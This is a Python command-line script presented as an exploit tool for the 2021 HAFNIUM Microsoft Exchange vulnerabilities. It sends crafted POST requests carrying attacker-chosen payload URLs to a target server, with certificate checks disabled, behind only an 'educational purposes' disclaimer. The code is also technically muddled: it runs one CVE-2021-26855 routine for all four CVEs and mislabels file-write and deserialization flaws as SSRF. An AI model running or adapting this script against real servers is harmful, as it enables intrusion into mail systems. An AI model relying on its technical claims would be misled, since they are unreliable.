import argparse
import requests

# HAFNIUM Vulnerability Exploitation Demo CLI
# This tool demonstrates exploiting the HAFNIUM vulnerabilities from 2021 (CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065).
# The tool focuses on CVE-2021-26855, a SSRF vulnerability that led to the broader HAFNIUM attack.
# The URLs below are examples of payloads that trigger the respective vulnerabilities.
# To use this script, provide the target URL and payload URLs for each CVE as command-line arguments.
# Please note that exploiting vulnerabilities without proper authorization is unethical and potentially illegal.
# This script is for educational purposes and should be used responsibly in controlled environments.
# Created by milosilo

def exploit_cve_2021_26855(target_url, payload):
    headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"}
    data = f"__VIEWSTATE=&__VIEWSTATEGENERATOR=&__EVENTVALIDATION=&url={payload}"

    response = requests.post(target_url, data=data, headers=headers, verify=False)
    return response

def main():
    parser = argparse.ArgumentParser(description="CVE-2021 HAFNIUM Vulnerability Exploitation Demo CLI")
    parser.add_argument("target_url", help="URL of the target Microsoft Exchange Server")
    parser.add_argument("payload_26855", help="URL to trigger the CVE-2021-26855 SSRF vulnerability (e.g., http://your-payload-domain.com)")
    parser.add_argument("payload_26857", help="URL to trigger the CVE-2021-26857 SSRF vulnerability (e.g., http://your-payload-domain.com)")
    parser.add_argument("payload_26858", help="URL to trigger the CVE-2021-26858 SSRF vulnerability (e.g., http://your-payload-domain.com)")
    parser.add_argument("payload_27065", help="URL to trigger the CVE-2021-27065 SSRF vulnerability (e.g., http://your-payload-domain.com)")

    args = parser.parse_args()

    print("Exploiting the CVE-2021 HAFNIUM vulnerabilities...")

    responses = {
        "26855": exploit_cve_2021_26855(args.target_url, args.payload_26855),
        "26857": exploit_cve_2021_26855(args.target_url, args.payload_26857),
        "26858": exploit_cve_2021_26855(args.target_url, args.payload_26858),
        "27065": exploit_cve_2021_26855(args.target_url, args.payload_27065)
    }

    for cve, response in responses.items():
        if response.status_code == 500 and "RemoteValidationException" in response.text:
            print(f"Exploited vulnerability {cve}. SSRF triggered.")
        else:
            print(f"Exploitation for vulnerability {cve} failed.")

if __name__ == "__main__":
    main()
